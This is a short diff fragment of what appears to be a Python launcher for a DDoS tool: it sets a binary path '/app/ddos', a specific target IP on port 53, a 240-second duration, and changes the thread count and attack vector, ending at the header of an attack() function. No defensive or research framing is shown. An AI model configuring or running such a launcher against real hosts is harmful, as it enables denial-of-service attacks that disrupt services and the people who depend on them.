@@ -8,8 +8,8 @@ BINARY = "/app/ddos"
 TARGET_IP = "147.75.202.61"
 TARGET_PORT = "53"
 DURATION = "240"
-THREADS = "640"
-VECTOR = "2"
+THREADS = "64"
+VECTOR = "5"
 
 def attack():
     # Make binary executable
